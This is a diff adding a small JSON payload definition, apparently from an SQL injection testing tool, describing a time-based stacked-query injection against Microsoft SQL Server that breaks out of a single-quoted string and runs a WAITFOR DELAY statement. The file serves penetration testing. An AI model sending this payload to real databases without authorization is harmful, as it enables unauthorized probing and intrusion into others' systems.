@@ -1,0 +1,12 @@
+{
+ "dbms": "mssql",
+ "technique": "stacked",
+ "boundary": {
+  "prefix": "'",
+  "suffix": "",
+  "type": "single-quote",
+  "desc": "single-quoted string"
+ },
+ "vector": "{B}; WAITFOR DELAY '0:0:{SLEEP}'-- -",
+ "comment": "mssql stacked via single-quoted string"
+}
